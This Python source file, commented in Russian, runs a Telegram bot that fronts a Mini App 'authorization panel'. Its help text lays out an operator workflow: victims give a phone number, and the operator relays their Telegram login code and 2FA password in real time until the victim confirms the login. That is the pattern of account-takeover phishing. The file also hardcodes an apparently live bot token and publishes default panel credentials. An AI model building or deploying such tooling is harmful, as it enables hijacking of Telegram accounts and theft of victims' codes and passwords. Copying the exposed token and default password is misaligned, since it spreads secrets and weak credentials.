#!/usr/bin/env python3
"""
Telegram Bot для Mini App
Установка: pip install pyTelegramBotAPI
Запуск: python bot.py
"""

import telebot
from telebot import types
import json
import logging

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Конфигурация
BOT_TOKEN = '8201555936:AAHIEz8LJ8tM_mgUzYkyLXSjoK2W_1quWj4'
ADMIN_ID = 5692738028  # Ваш ID

# URL вашего Mini App на Netlify
MINI_APP_URL = 'https://ваш-сайт.netlify.app'  # Замените на ваш URL

# Инициализация бота
bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    """Отправляем приветственное сообщение с кнопкой Mini App"""
    
    # Создаем клавиатуру с кнопкой Mini App
    markup = types.InlineKeyboardMarkup()
    
    web_app = types.WebAppInfo(url=MINI_APP_URL)
    btn_mini_app = types.InlineKeyboardButton(
        text="📱 Открыть панель авторизации",
        web_app=web_app
    )
    
    markup.add(btn_mini_app)
    
    # Текст приветствия
    welcome_text = (
        "👋 *Добро пожаловать в панель авторизации Telegram!*\n\n"
        "📋 *Возможности:*\n"
        "• Создание сессий авторизации\n"
        "• Ввод кодов из Telegram\n"
        "• Управление паролями 2FA\n"
        "• Подтверждение авторизации\n\n"
        "⚡ *Быстрые команды:*\n"
        "/sessions - Список активных сессий\n"
        "/new - Новая сессия\n"
        "/help - Помощь\n\n"
        "Нажмите кнопку ниже, чтобы открыть панель управления👇"
    )
    
    bot.send_message(
        message.chat.id,
        welcome_text,
        parse_mode='Markdown',
        reply_markup=markup
    )

@bot.message_handler(commands=['help'])
def send_help(message):
    help_text = (
        "🆘 *Помощь по использованию*\n\n"
        "📱 *Mini App панель:*\n"
        "1. Нажмите кнопку 'Открыть панель'\n"
        "2. Войдите с логином: `admin`, пароль: `admin123`\n"
        "3. Создайте новую сессию авторизации\n"
        "4. Вводите коды и пароли по мере их получения\n\n"
        "🔑 *Процесс авторизации:*\n"
        "1. Пользователь вводит номер телефона\n"
        "2. Получает код в Telegram\n"
        "3. Вы вводите код в панели\n"
        "4. Пользователь вводит пароль 2FA\n"
        "5. Вы подтверждаете пароль\n"
        "6. Пользователь нажимает 'Да, это Я'\n"
        "7. Авторизация завершена!\n\n"
        "📞 *Поддержка:* @ваш_аккаунт"
    )
    
    bot.send_message(message.chat.id, help_text, parse_mode='Markdown')

@bot.message_handler(commands=['sessions'])
def list_sessions(message):
    """Показывает активные сессии (заглушка)"""
    sessions_text = (
        "📋 *Активные сессии*\n\n"
        "1. 📞 79001112233 - Код введен\n"
        "2. 📞 79002223344 - Ожидает код\n"
        "3. 📞 79003334455 - Завершена\n\n"
        "Для управления откройте панель👇"
    )
    
    markup = types.InlineKeyboardMarkup()
    web_app = types.WebAppInfo(url=MINI_APP_URL)
    btn = types.InlineKeyboardButton("📱 Открыть панель", web_app=web_app)
    markup.add(btn)
    
    bot.send_message(
        message.chat.id,
        sessions_text,
        parse_mode='Markdown',
        reply_markup=markup
    )

@bot.message_handler(commands=['new'])
def new_session(message):
    """Быстрое создание новой сессии"""
    markup = types.InlineKeyboardMarkup()
    web_app = types.WebAppInfo(url=MINI_APP_URL)
    btn = types.InlineKeyboardButton("📱 Создать сессию", web_app=web_app)
    markup.add(btn)
    
    bot.send_message(
        message.chat.id,
        "Нажмите кнопку ниже, чтобы создать новую сессию авторизации:",
        reply_markup=markup
    )

@bot.message_handler(func=lambda message: True)
def echo_all(message):
    """Обработка всех остальных сообщений"""
    if message.chat.id == ADMIN_ID:
        bot.reply_to(
            message,
            "Откройте панель управления для работы с авторизациями👇",
            reply_markup=types.InlineKeyboardMarkup().add(
                types.InlineKeyboardButton(
                    "📱 Открыть панель",
                    web_app=types.WebAppInfo(url=MINI_APP_URL)
                )
            )
        )
    else:
        bot.reply_to(
            message,
            "Этот бот предназначен для управления авторизациями. "
            "Обратитесь к администратору."
        )

def main():
    """Запуск бота"""
    print("🤖 Бот запускается...")
    print(f"🔗 Mini App URL: {MINI_APP_URL}")
    print(f"👑 Админ ID: {ADMIN_ID}")
    print("⏳ Ожидаю сообщений...")
    
    try:
        bot.infinity_polling()
    except Exception as e:
        logger.error(f"Ошибка бота: {e}")

if __name__ == '__main__':
    main()